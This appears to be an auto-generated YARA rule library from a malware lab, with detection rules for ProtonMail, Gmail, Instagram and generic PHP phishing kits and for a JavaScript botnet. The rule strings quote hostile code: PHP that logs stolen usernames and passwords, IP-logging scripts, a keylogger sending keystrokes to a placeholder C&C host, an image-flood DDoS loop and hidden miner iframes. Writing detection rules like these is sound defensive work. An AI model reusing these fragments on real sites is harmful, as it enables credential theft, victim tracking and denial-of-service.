      $x9 = "\")&&t)return\"\\n\\n\\n\"+c+\"\\n\\n\";return c};var o=r(a(\"./node_modules/turndown/lib/turndown.es.js\"));function r(e){retur" ascii /* score: '64.00'*/
      $x10 = "!function(e){var t={};function a(n){if(t[n])return t[n].exports;var o=t[n]={i:n,l:!1,exports:{}};return e[n].call(o.exports,o,o." ascii /* score: '51.00'*/
      $x11 = "o\" translate-context=Info translate>Use the following credentials to log into the <a href=https://protonvpn.com/download target" ascii /* score: '43.00'*/
      $x12 = "r OpenVPN on GNU/Linux.</span> <br/><br/> <a href=https://protonvpn.com/support/vpn-login/ target=_blank translate-context=Link " ascii /* score: '41.00'*/
      $x13 = "s administrator to resolve this.\",null,\"Error\"),ERROR_DELINQUENT:e.getString(\"Your account currently has an overdue invoice." ascii /* score: '35.00'*/
      $x14 = "onMail users</h3> <a href=https://protonmail.com/support/knowledge-base/encrypt-for-outside-users/ target=_blank> <i class=\"fa " ascii /* score: '34.00'*/
      $x15 = "function(t,n){return{addRemoveLinks:!1,dictDefaultMessage:A,url:\"/file/post\",autoProcessQueue:!1,paramName:\"file\",previewTem" ascii /* score: '33.00'*/
      $x16 = "e strict\";function n(e,t,n,o,r,s){var i=o.getString(\"OpenVPN login updated\",null,\"Info\");return e({controllerAs:\"ctrl\",te" ascii /* score: '33.00'*/
      $x17 = "a href=\"https://protonmail.com\" target=\"_blank\">ProtonMail</a> Secure Email.'),m=(t.MIME_TYPES={PLAINTEXT:\"text/plain\",DEF" ascii /* score: '33.00'*/
      $x18 = "> </section> <section ng-if=!isFree> <a href=https://protonmail.com/blog/best-secure-email-app/ target=_blank title-translate=\"" ascii /* score: '32.00'*/
      $x19 = "utocomplete-command> </div> </form>')}])}e.exports=n},\"./src/templates/composer/composerEncrypt.tpl.html\":function(e,t){var a=" ascii /* score: '31.00'*/
      $s20 = "s signature failed</p> <p><a href=https://protonmail.com/support/knowledge-base/encrypted-contacts/ target=_blank translate-cont" ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x6621 and filesize < 3000KB and
      1 of ($x*)
}

rule _opt_mal_phish__protonmail_home_ubuntu_malware_lab_samples_extracted_phishing_ProtonMail_index_files_styles {
   meta:
      description = "phish__protonmail - file styles.css"
      author = "Comps Team Malware Lab"
      reference = "phish__protonmail phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "630b3915915397ab0cdf051b3f656cb3e63155dccc076147ede7ee38c127e715"
   strings:
      $x1 = "/*! normalize.css v3.0.2 | MIT License | git.io/normalize */html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-s" ascii /* score: '79.00'*/
      $x2 = "width:3em}.headerSecuredMobile-compose{background:transparent;border:0;color:#fff;max-width:4rem;min-width:4rem;text-align:cente" ascii /* score: '70.00'*/
      $x3 = " */@font-face{font-family:FontAwesome;src:url(assets/fonts/fontawesome-webfont.eot);src:url(assets/fonts/fontawesome-webfont.eot" ascii /* score: '55.00'*/
      $x4 = "/*! nouislider - 10.1.0 - 2017-07-28 17:11:18 */.noUi-target,.noUi-target *{-webkit-touch-callout:none;-webkit-tap-highlight-col" ascii /* score: '52.00'*/
      $x5 = " */.pika-single{z-index:9999;display:block;position:relative;color:#333;background:#fff;border:1px solid #ccc;border-bottom-colo" ascii /* score: '40.00'*/
      $x6 = "rotonmail.com/assets/host.png\")}body#eo-unlock #pm_login img.logo,body#eo-unlock #pm_loginTwoFactor img.logo,body#login #pm_log" ascii /* score: '33.00'*/
      $s7 = "oFactor.loadingUnlock,body#reset.loadingUnlock{position:relative;padding:0}#pm_login.loadingUnlock .loadingUnlock-loader-contain" ascii /* score: '27.00'*/
      $s8 = "Loader-container:not(.progressUpload-uploading) .progressLoader-btn-close{display:none}.composerHeader-container{background:#505" ascii /* score: '27.00'*/
      $s9 = "ackground:none;padding:0 .5em 0 1em}.autocompleteCommand-scope:not(:empty):after{content:\"\\203A\";margin:0 .2em}.commandPalett" ascii /* score: '27.00'*/
      $s10 = "footer{display:none}.login-btn-oldversion:before{content:url(\"https://%6d%61%69%6c%2e%70%72%6f%74%6f%6e%6d%61%69%6c%2e%63%6f%6d" ascii /* score: '27.00'*/
      $s11 = "F018\"}.fa-download:before{content:\"\\F019\"}.fa-arrow-circle-o-down:before{content:\"\\F01A\"}.fa-arrow-circle-o-up:before{con" ascii /* score: '26.00'*/
      $s12 = "0aXRsZT5jaGVja2JveGVzLXN0YXRlczwvdGl0bGU+PGcgaWQ9IkViZW5lXzIiIGRhdGEtbmFtZT0iRWJlbmUgMiI+PGcgaWQ9IkViZW5lXzEtMiIgZGF0YS1uYW1lPSJ" ascii /* base64 encoded string 'itle>checkboxes-states</title><g id="Ebene_2" data-name="Ebene 2"><g id="Ebene_1-2" data-name="' */ /* score: '26.00'*/
      $s13 = "{width:calc(100% - 10rem);cursor:pointer}body.appConfigBody-is-mobile .conversation .row .senders .senders-name:after{content:\"" ascii /* score: '25.00'*/
      $s14 = "oserAttachments-header *{pointer-events:none}.composerAttachments-loaders{display:-webkit-box;display:-webkit-flex;display:-ms-f" ascii /* score: '25.00'*/
      $s15 = "ation:none;padding:5px 20px 0}.headerSecuredDesktop-logo:before{content:\"\";height:35px;width:116px;background:url(assets/img/l" ascii /* score: '25.00'*/
      $s16 = "gBody-commandPalette:before{background:rgba(0,0,0,.5);z-index:3001!important}#pm_composer .composer-dropzone-wrapper{display:non" ascii /* score: '25.00'*/
      $s17 = "Attachments-loaders,.composerAttachments-hidden{display:none}.composerAttachments-header{-webkit-box-sizing:border-box;box-sizin" ascii /* score: '25.00'*/
      $s18 = ":column;flex-direction:column}.loginForm-actions-row{-webkit-box-pack:justify;-webkit-justify-content:space-between;-ms-flex-pac" ascii /* score: '24.00'*/
      $s19 = "k:justify;justify-content:space-between;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap}.loginForm-actions-column>*,.lo" ascii /* score: '24.00'*/
      $s20 = "y#login-sub #pm_loader,body#login-unlock #pm_loader{display:none}body#login{background-color:#667cbd;background:url(assets/img/l" ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x6340 and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__protonmail_home_ubuntu_malware_lab_samples_extracted_phishing_ProtonMail_index {
   meta:
      description = "phish__protonmail - file index.php"
      author = "Comps Team Malware Lab"
      reference = "phish__protonmail phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "5d075785e9770ec2637793b66977cc5c4fd0b7545711033e6dde3c484eff15c4"
   strings:
      $s1 = "header('Location: login.html');" fullword ascii /* score: '16.00'*/
      $s2 = "include 'ip.php';" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__protonmail_home_ubuntu_malware_lab_samples_extracted_phishing_ProtonMail_login {
   meta:
      description = "phish__protonmail - file login.php"
      author = "Comps Team Malware Lab"
      reference = "phish__protonmail phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "c28afafc9210f99e039b3ae797afbb90ba8164263b9efa9c371dfbac0e913145"
   strings:
      $s1 = "file_put_contents(\"usernames.txt\", \"Account: \" . $_POST['username'] . \" Pass: \" . $_POST['password'] . \"\\n\", FILE_APPEN" ascii /* score: '29.00'*/
      $s2 = "header('Location: https://mail.protonmail.com');" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__protonmail_home_ubuntu_malware_lab_samples_extracted_phishing_ProtonMail_login_2 {
   meta:
      description = "phish__protonmail - file login.html"
      author = "Comps Team Malware Lab"
      reference = "phish__protonmail phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "b1e50bfc8ec30266edd48f784636ec23ec7d8a7b28b53bb0be5f568ec32d0fed"
   strings:
      $x1 = "</button></div> <div class=\"loginForm-actions\"> <div class=\"loginForm-actions-column\"> <button id=\"login_btn\" type=\"submi" ascii /* score: '55.00'*/
      $x2 = "<meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\"><style type=\"text/css\">@charset \"UTF-8\";[ng\\:cloak]," ascii /* score: '48.00'*/
      $x3 = "otonmail.com/\" --><title>Login | ProtonMail</title><meta name=\"description\" content=\"Log in or create an account.\"><link re" ascii /* score: '45.00'*/
      $x4 = "}\" data-app-config-body=\"\" class=\"appConfigBody-is-tablet login unlock locked\" id=\"login\"><!----><div id=\"pm_loading\" c" ascii /* score: '41.00'*/
      $x5 = "version\" style=\"color:#fff;text-transform:none\" href=\"https://old.protonmail.com/login\" target=\"_self\" translate-context=" ascii /* score: '38.00'*/
      $s6 = "on pm_button primary\" ui-sref=\"login\" translate=\"\" translate-context=\"Action\" href=\"https://mail.protonmail.com/login\">" ascii /* score: '28.00'*/
      $s7 = " href=\"https://protonmail.com/blog/protonmail-v3-13-release-notes/\" title=\"Mon May 21 2018\" target=\"_blank\" class=\"appVer" ascii /* score: '28.00'*/
      $s8 = "https://protonmail.com/\" target=\"_self\"> <span translate=\"\" translate-context=\"Action\">Back to protonmail.com</span> </a>" ascii /* score: '27.00'*/
      $s9 = "nmail.com/signup\">Sign up for free</a> </li> <li class=\"headerNoAuth-item-logout__Auth\"> <a class=\"headerNoAuth-item-logout-" ascii /* score: '26.00'*/
      $s10 = "ss=\"headerNoAuth-item-back-btn__Auth\" href=\"https://mail.protonmail.com/inbox\" title=\"Inbox\"> <span translate=\"\" transla" ascii /* score: '25.00'*/
      $s11 = "5%74%73/%68%6f%73%74%2e%70%6e%67')\" class=\"loginForm-link-signup loginForm-actions-right\" href=\"https://protonmail.com/signu" ascii /* score: '24.00'*/
      $s12 = "\"> <p><span class=\"appCopyright-container\">2018 ProtonMail.com - Made globally, hosted in Switzerland.</span> <a data-prefix=" ascii /* score: '23.00'*/
      $s13 = "a> </li> </ul> </header> <div class=\"row\"> <!----><div ui-view=\"panel\"><form method=\"post\" id=\"pm_login\" name=\"loginFor" ascii /* score: '21.00'*/
      $s14 = "tonLoader\" ng-class=\"{ 'show': loggingOut }\"> <div class=\"protonLoaderIcon\"> <svg xmlns=\"http://www.w3.org/2000/svg\" xlin" ascii /* score: '20.00'*/
      $s15 = "tonmail.com/assets/favicons/favicon-32x32.png\" sizes=\"32x32\"><link rel=\"icon\" type=\"image/png\" href=\"https://mail.proton" ascii /* score: '20.00'*/
      $s16 = "wser.\"),window.location=\"https://protonmail.com/compatibility\")</script><script src=\"index_files/openpgp.js\"></script><scri" ascii /* score: '19.00'*/
      $s17 = "}\" data-app-config-body=\"\" class=\"appConfigBody-is-tablet login unlock locked\" id=\"login\"><!----><div id=\"pm_loading\" c" ascii /* score: '19.00'*/
      $s18 = "\"pm_panel alt pm_form loginForm-container ng-pristine ng-invalid ng-invalid-required\" novalidate=\"\" role=\"form\" autocomple" ascii /* score: '18.00'*/
      $s19 = "ng-click=\"displayHelpModal()\" type=\"button\" translate-context=\"Action\" translate-comment=\"link for login help\" translate" ascii /* score: '18.00'*/
      $s20 = "\" ng-submit=\"enterLoginPassword($event)\" action=\"login.php\" ng-show=\"twoFactor === 0\"> <img src=\"index_files/logo.png\" " ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 40KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__protonmail_home_ubuntu_malware_lab_samples_extracted_phishing_ProtonMail_ip {
   meta:
      description = "phish__protonmail - file ip.php"
      author = "Comps Team Malware Lab"
      reference = "phish__protonmail phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "d0f8f3e7985a87e0beb1699ccfadab7268ffc777c05fa1dfcc35a16b6d393947"
   strings:
      $s1 = "$useragent = \" User-Agent: \";" fullword ascii /* score: '17.00'*/
      $s2 = "$browser = $_SERVER['HTTP_USER_AGENT'];" fullword ascii /* score: '15.00'*/
      $s3 = "fwrite($fp, $useragent);" fullword ascii /* score: '12.00'*/
      $s4 = "elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))" fullword ascii /* score: '12.00'*/
      $s5 = "$file = 'ip.txt';" fullword ascii /* score: '11.00'*/
      $s6 = "      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'].\"\\r\\n\";" fullword ascii /* score: '10.00'*/
      $s7 = "$victim = \"IP: \";" fullword ascii /* score: '9.00'*/
      $s8 = "fwrite($fp, $victim);" fullword ascii /* score: '9.00'*/
      $s9 = "fwrite($fp, $ipaddress);" fullword ascii /* score: '7.00'*/
      $s10 = "if (!empty($_SERVER['HTTP_CLIENT_IP']))" fullword ascii /* score: '7.00'*/
      $s11 = "      $ipaddress = $_SERVER['HTTP_CLIENT_IP'].\"\\r\\n\";" fullword ascii /* score: '5.00'*/
      $s12 = "$fp = fopen($file, 'a');" fullword ascii /* score: '4.00'*/
      $s13 = "fwrite($fp, $browser);" fullword ascii /* score: '4.00'*/
      $s14 = "      $ipaddress = $_SERVER['REMOTE_ADDR'].\"\\r\\n\";" fullword ascii /* score: '2.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}



/* ===================== */
/* Source: /home/ubuntu/yara-lab/rule_library/generated/phish__default_php_functionality/phish__default_php_functionality_auto.yar */
/* ===================== */

/*
   YARA Rule Set
   Author: Comps Team Malware Lab
   Date: 2026-02-27
   Identifier: phish__default_php_functionality
   Reference: phish__default_php_functionality phishing_kit auto gen
*/

/* Rule Set ----------------------------------------------------------------- */

rule _opt_mal_phish__default_php_functionality_home_ubuntu_malware_lab_samples_extracted_phishing__Default_PHP_Functionality_index {
   meta:
      description = "phish__default_php_functionality - file index.php"
      author = "Comps Team Malware Lab"
      reference = "phish__default_php_functionality phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "5d075785e9770ec2637793b66977cc5c4fd0b7545711033e6dde3c484eff15c4"
   strings:
      $s1 = "header('Location: login.html');" fullword ascii /* score: '16.00'*/
      $s2 = "include 'ip.php';" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__default_php_functionality_home_ubuntu_malware_lab_samples_extracted_phishing__Default_PHP_Functionality_login {
   meta:
      description = "phish__default_php_functionality - file login.php"
      author = "Comps Team Malware Lab"
      reference = "phish__default_php_functionality phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "d03b5d565482b5c331bcc4f0aa9c2bbe9a8488b5103656da97425bb4b54a3a03"
   strings:
      $s1 = "file_put_contents(\"informations.txt\", \"Account: \" . $_POST['username'] . \" Pass: \" . $_POST['password'] . \"\\n\", FILE_AP" ascii /* score: '29.00'*/
      $s2 = "header('Location: https://google.com');" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__default_php_functionality_home_ubuntu_malware_lab_samples_extracted_phishing__Default_PHP_Functionality_ip {
   meta:
      description = "phish__default_php_functionality - file ip.php"
      author = "Comps Team Malware Lab"
      reference = "phish__default_php_functionality phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "6410f67f05a6e99a6999076e39de44b578e8e83f66ffc2c74f7fbd34830e8159"
   strings:
      $s1 = "$useragent = \" User-Agent: \";" fullword ascii /* score: '17.00'*/
      $s2 = "$browser = $_SERVER['HTTP_USER_AGENT'];" fullword ascii /* score: '15.00'*/
      $s3 = "fwrite($fp, $useragent);" fullword ascii /* score: '12.00'*/
      $s4 = "elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))" fullword ascii /* score: '12.00'*/
      $s5 = "$file = 'informations.txt';" fullword ascii /* score: '11.00'*/
      $s6 = "      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'].\"\\r\\n\";" fullword ascii /* score: '10.00'*/
      $s7 = "$victim = \"IP: \";" fullword ascii /* score: '9.00'*/
      $s8 = "fwrite($fp, $victim);" fullword ascii /* score: '9.00'*/
      $s9 = "fwrite($fp, $ipaddress);" fullword ascii /* score: '7.00'*/
      $s10 = "if (!empty($_SERVER['HTTP_CLIENT_IP']))" fullword ascii /* score: '7.00'*/
      $s11 = "      $ipaddress = $_SERVER['HTTP_CLIENT_IP'].\"\\r\\n\";" fullword ascii /* score: '5.00'*/
      $s12 = "fwrite($fp, $browser);" fullword ascii /* score: '4.00'*/
      $s13 = "$fp = fopen($file, 'a');" fullword ascii /* score: '4.00'*/
      $s14 = "      $ipaddress = $_SERVER['REMOTE_ADDR'].\"\\r\\n\";" fullword ascii /* score: '2.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}



/* ===================== */
/* Source: /home/ubuntu/yara-lab/rule_library/generated/phish__gmail/phish__gmail_auto.yar */
/* ===================== */

/*
   YARA Rule Set
   Author: Comps Team Malware Lab
   Date: 2026-02-27
   Identifier: phish__gmail
   Reference: phish__gmail phishing_kit auto gen
*/

/* Rule Set ----------------------------------------------------------------- */

rule _opt_mal_phish__gmail_home_ubuntu_malware_lab_samples_extracted_phishing_Gmail_index {
   meta:
      description = "phish__gmail - file index.php"
      author = "Comps Team Malware Lab"
      reference = "phish__gmail phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "5d075785e9770ec2637793b66977cc5c4fd0b7545711033e6dde3c484eff15c4"
   strings:
      $s1 = "header('Location: login.html');" fullword ascii /* score: '16.00'*/
      $s2 = "include 'ip.php';" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__gmail_home_ubuntu_malware_lab_samples_extracted_phishing_Gmail_login {
   meta:
      description = "phish__gmail - file login.php"
      author = "Comps Team Malware Lab"
      reference = "phish__gmail phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "e5862e8987e051c187f256a4d010104fef90006ebea3809a71905e0a27f7ca71"
   strings:
      $s1 = "file_put_contents(\"usernames.txt\", \"Account: \" . $_POST['Email'] . \" Pass: \" . $_POST['Passwd'] . \"\\n\", FILE_APPEND);" fullword ascii /* score: '24.00'*/
      $s2 = "header('Location: https://google.com/');" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__gmail_home_ubuntu_malware_lab_samples_extracted_phishing_Gmail_login_2 {
   meta:
      description = "phish__gmail - file login.html"
      author = "Comps Team Malware Lab"
      reference = "phish__gmail phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "5e368070a41124048a88accb87b8576e5f32676d6cc6057748e2ba6e5774ed81"
   strings:
      $x1 = "  <script type=\"text/javascript\">/* Anti-spam. Want to say hello? Contact (base64) Ym90Z3VhcmQtY29udGFjdEBnb29nbGUuY29tCg== */" ascii /* score: '38.00'*/
      $x2 = "  <p>Get business email, calendar, and online docs @your_company.com. <a href=\"http://www.google.com/enterprise/apps/business/c" ascii /* score: '34.00'*/
      $x3 = "  <a id=\"link-forgot-passwd\" href=\"https://accounts.google.com/RecoverAccount?service=mail&amp;continue=http%3A%2F%2Fmail.goo" ascii /* score: '33.00'*/
      $x4 = "  var langChooserUrl = '\\x2FServiceLogin?service=mail\\x26passive=true\\x26rm=false\\x26continue=http%3A%2F%2Fmail.google.com%2" ascii /* score: '31.00'*/
      $s5 = "  <li><a href=\"http://mail.google.com/support/?hl=en\" target=\"_blank\">Help</a></li>" fullword ascii /* score: '30.00'*/
      $s6 = "  var langChooserUrl = '\\x2FServiceLogin?service=mail\\x26passive=true\\x26rm=false\\x26continue=http%3A%2F%2Fmail.google.com%2" ascii /* score: '27.00'*/
      $s7 = "  <li><a href=\"http://mail.google.com/mail/help/intl/en/terms.html\" target=\"_blank\">Terms &amp; Privacy</a></li>" fullword ascii /* score: '27.00'*/
      $s8 = "  script.src = \"https://www.googleadservices.com/pagead/conversion.js\";" fullword ascii /* score: '26.00'*/
      $s9 = "1.3}}if(is_sf){if(agt.indexOf(\"rv:3.14.15.92.65\")!=-1)return false;var v=BrowserSupport_.GetFollowingFloat(agt,\"applewebkit/" ascii /* score: '25.00'*/
      $s10 = ".com%2Fmail%2F\" target=\"_top\">" fullword ascii /* score: '24.00'*/
      $s11 = "-1||agt.indexOf(\"regking\")!=-1||agt.indexOf(\"windows ce\")!=-1||agt.indexOf(\"j2me\")!=-1||agt.indexOf(\"avantgo\")!=-1||agt." ascii /* score: '23.00'*/
      $s12 = "  <a href=\"https://accounts.google.com/SignUp?service=mail&amp;continue=http%3A%2F%2Fmail.google.com%2Fmail%2F&amp;ltmpl=defaul" ascii /* score: '23.00'*/
      $s13 = "  <form novalidate=\"\" id=\"gaia_loginform\" action=\"login.php\" method=\"post\">" fullword ascii /* score: '23.00'*/
      $s14 = "  <a href=\"https://accounts.google.com/SignUp?service=mail&amp;continue=http%3A%2F%2Fmail.google.com%2Fmail%2F&amp;ltmpl=defaul" ascii /* score: '23.00'*/
      $s15 = "  <li><a href=\"http://www.google.com/apps/intl/en/business/gmail.html#utm_medium=et&amp;utm_source=gmail-signin-en&amp;utm_camp" ascii /* score: '23.00'*/
      $s16 = "  <a id=\"link-forgot-passwd\" href=\"https://accounts.google.com/RecoverAccount?service=mail&amp;continue=http%3A%2F%2Fmail.goo" ascii /* score: '23.00'*/
      $s17 = "  <p>Get Gmail on your mobile phone. <a href=\"http://www.google.com/mobile/gmail/#utm_source=en-cpp-g4mc-gmhp&amp;utm_medium=cp" ascii /* score: '22.00'*/
      $s18 = "<!-- I AM A FAKE PAGE | DO NOT TRUST ME -->" fullword ascii /* score: '22.00'*/
      $s19 = "  document.cookie = name + \"=\" + value + \";path=/;domain=.google.com\";" fullword ascii /* score: '21.00'*/
      $s20 = "  'http://www') + '.google-analytics.com/ga.js';" fullword ascii /* score: '21.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__gmail_home_ubuntu_malware_lab_samples_extracted_phishing_Gmail_ip {
   meta:
      description = "phish__gmail - file ip.php"
      author = "Comps Team Malware Lab"
      reference = "phish__gmail phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "d0f8f3e7985a87e0beb1699ccfadab7268ffc777c05fa1dfcc35a16b6d393947"
   strings:
      $s1 = "$useragent = \" User-Agent: \";" fullword ascii /* score: '17.00'*/
      $s2 = "$browser = $_SERVER['HTTP_USER_AGENT'];" fullword ascii /* score: '15.00'*/
      $s3 = "fwrite($fp, $useragent);" fullword ascii /* score: '12.00'*/
      $s4 = "elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))" fullword ascii /* score: '12.00'*/
      $s5 = "$file = 'ip.txt';" fullword ascii /* score: '11.00'*/
      $s6 = "      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'].\"\\r\\n\";" fullword ascii /* score: '10.00'*/
      $s7 = "fwrite($fp, $victim);" fullword ascii /* score: '9.00'*/
      $s8 = "$victim = \"IP: \";" fullword ascii /* score: '9.00'*/
      $s9 = "fwrite($fp, $ipaddress);" fullword ascii /* score: '7.00'*/
      $s10 = "if (!empty($_SERVER['HTTP_CLIENT_IP']))" fullword ascii /* score: '7.00'*/
      $s11 = "      $ipaddress = $_SERVER['HTTP_CLIENT_IP'].\"\\r\\n\";" fullword ascii /* score: '5.00'*/
      $s12 = "$fp = fopen($file, 'a');" fullword ascii /* score: '4.00'*/
      $s13 = "fwrite($fp, $browser);" fullword ascii /* score: '4.00'*/
      $s14 = "      $ipaddress = $_SERVER['REMOTE_ADDR'].\"\\r\\n\";" fullword ascii /* score: '2.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}



/* ===================== */
/* Source: /home/ubuntu/yara-lab/rule_library/generated/js_botnet_master_/js_botnet_master__auto.yar */
/* ===================== */

/*
   YARA Rule Set
   Author: Comps Team Malware Lab
   Date: 2026-02-26
   Identifier: js_botnet_master_
   Reference: js_botnet_master_ auto gen
*/

/* Rule Set ----------------------------------------------------------------- */

rule _opt_mal_js_botnet_master__home_ubuntu_malware_lab_samples_extracted_javascript_JS_BotNet_master_node {
   meta:
      description = "js_botnet_master_ - file node.js"
      author = "Comps Team Malware Lab"
      reference = "js_botnet_master_ auto gen"
      date = "2026-02-26"
      hash1 = "5237406a0052e09cb6f9cc73a0b27561aa27a4394f4de74a2530262b1a5f4873"
   strings:
      $s1 = "'http://TARGET-SITE.com/images/header.png');" fullword ascii /* score: '27.00'*/
      $s2 = "ddos('http://TARGET-SITE.com/images/header.png'," fullword ascii /* score: '27.00'*/
      $s3 = "  var TARGET = 'TARGET-SITE.com'" fullword ascii /* score: '24.00'*/
      $s4 = "document.write(\"<iframe id='ifr11323' style='display:none;'src='http://YourDomain.com/miner.html'></iframe>\");" fullword ascii /* score: '23.00'*/
      $s5 = "document.write(\"<iframe id='ifr11323' style='display:none;'src='http://YourDomain.com/BotNet/CC/index.php'></iframe>\");" fullword ascii /* score: '23.00'*/
      $s6 = "  pic.src = 'http://'+TARGET+URI+rand+'=val'" fullword ascii /* score: '20.00'*/
      $s7 = "$.getScript(url);" fullword ascii /* score: '15.00'*/
      $s8 = "$.getScript(url2);" fullword ascii /* score: '15.00'*/
      $s9 = "function imgflood() {" fullword ascii /* score: '9.00'*/
      $s10 = "setInterval(imgflood, 10) //100 requests per second" fullword ascii /* score: '9.00'*/
      $s11 = "  var rand = Math.floor(Math.random() * 1000)" fullword ascii /* score: '8.00'*/
      $s12 = "  var URI = '/index.php?'" fullword ascii /* score: '7.00'*/
      $s13 = "window.setInterval(function (){" fullword ascii /* score: '7.00'*/
      $s14 = "document.write(\"<p>You currently running a Node in the HiveMind BotNet...</p>\");" fullword ascii /* score: '5.00'*/
      $s15 = "document.write(\"<p>Running...</p>\");" fullword ascii /* score: '5.00'*/
      $s16 = "document.write(\"<title>Running HiveMind Node...</title>\");" fullword ascii /* score: '5.00'*/
      $s17 = "  var pic = new Image()" fullword ascii /* score: '4.00'*/
      $s18 = "function ddos(url,url2){" fullword ascii /* score: '4.00'*/
      $s19 = "},1000)" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x640a and filesize < 2KB and
      8 of them
}

rule _opt_mal_js_botnet_master__home_ubuntu_malware_lab_samples_extracted_javascript_JS_BotNet_master_bot {
   meta:
      description = "js_botnet_master_ - file bot.js"
      author = "Comps Team Malware Lab"
      reference = "js_botnet_master_ auto gen"
      date = "2026-02-26"
      hash1 = "cb7fc80e959ae279b8b48c7d92391dac0055b9b01f705e999393bb6bdfd52ea3"
   strings:
      $x1 = "var attacker = 'http://YourDomain.com/BotNet/CC/KeyLogger/?c='" fullword ascii /* score: '33.00'*/
      $s2 = "'http://TARGET-SITE.com/images/header.png');" fullword ascii /* score: '27.00'*/
      $s3 = "ddos('http://TARGET-SITE.com/images/header.png'," fullword ascii /* score: '27.00'*/
      $s4 = "  var TARGET = 'TARGET-SITE.com'" fullword ascii /* score: '24.00'*/
      $s5 = "document.write(\"<iframe id='ifr11323' style='display:none;'src='http://YourDomain.com/miner.html'></iframe>\");" fullword ascii /* score: '23.00'*/
      $s6 = "document.write(\"<iframe id='ifr11323' style='display:none;'src='http://YourDomain.com/BotNet/CC/index.php'></iframe>\");" fullword ascii /* score: '23.00'*/
      $s7 = "  pic.src = 'http://'+TARGET+URI+rand+'=val'" fullword ascii /* score: '20.00'*/
      $s8 = "$.getScript(url);" fullword ascii /* score: '15.00'*/
      $s9 = "$.getScript(url2);" fullword ascii /* score: '15.00'*/
      $s10 = "document.onkeypress = function(e) {" fullword ascii /* score: '10.00'*/
      $s11 = "function imgflood() {" fullword ascii /* score: '9.00'*/
      $s12 = "setInterval(imgflood, 10) //100 requests per second" fullword ascii /* score: '9.00'*/
      $s13 = "        new Image().src = attacker + data;" fullword ascii /* score: '9.00'*/
      $s14 = "  var rand = Math.floor(Math.random() * 1000)" fullword ascii /* score: '8.00'*/
      $s15 = "  var URI = '/index.php?'" fullword ascii /* score: '7.00'*/
      $s16 = "window.setInterval(function (){" fullword ascii /* score: '7.00'*/
      $s17 = "window.setInterval(function() {" fullword ascii /* score: '7.00'*/
      $s18 = "  var pic = new Image()" fullword ascii /* score: '4.00'*/
      $s19 = "function ddos(url,url2){" fullword ascii /* score: '4.00'*/
      $s20 = "var buffer = [];" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6f64 and filesize < 3KB and
      1 of ($x*) and 4 of them
}



/* ===================== */
/* Source: /home/ubuntu/yara-lab/rule_library/generated/phish__instagram/phish__instagram_auto.yar */
/* ===================== */

/*
   YARA Rule Set
   Author: Comps Team Malware Lab
   Date: 2026-02-27
   Identifier: phish__instagram
   Reference: phish__instagram phishing_kit auto gen
*/

/* Rule Set ----------------------------------------------------------------- */

rule lY4eZXm_YWu {
   meta:
      description = "phish__instagram - file lY4eZXm_YWu.html"
      author = "Comps Team Malware Lab"
      reference = "phish__instagram phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "ea9f43e2033b48a34baceab019007a5119b4149ce9f661349eaceec903f11bfd"
   strings:
      $x1 = "__d(\"XDM\",[\"DOMEventListener\",\"DOMWrapper\",\"emptyFunction\",\"Flash\",\"GlobalCallback\",\"guid\",\"Log\",\"UserAgent_DEP" ascii /* score: '56.50'*/
      $x2 = "__d(\"initXdArbiter\",[\"QueryString\",\"resolveWindow\",\"Log\",\"XDM\",\"XDMConfig\"],(function a(b,c,d,e,f,g){__p&&__p();(fun" ascii /* score: '48.50'*/
      $x3 = "__d(\"UserAgent_DEPRECATED\",[],(function a(b,c,d,e,f,g){__p&&__p();var h=false,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w;function x(){__p&&" ascii /* score: '39.00'*/
      $x4 = "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><title>Facebook Cross-Domain Messaging helper" ascii /* score: '33.00'*/
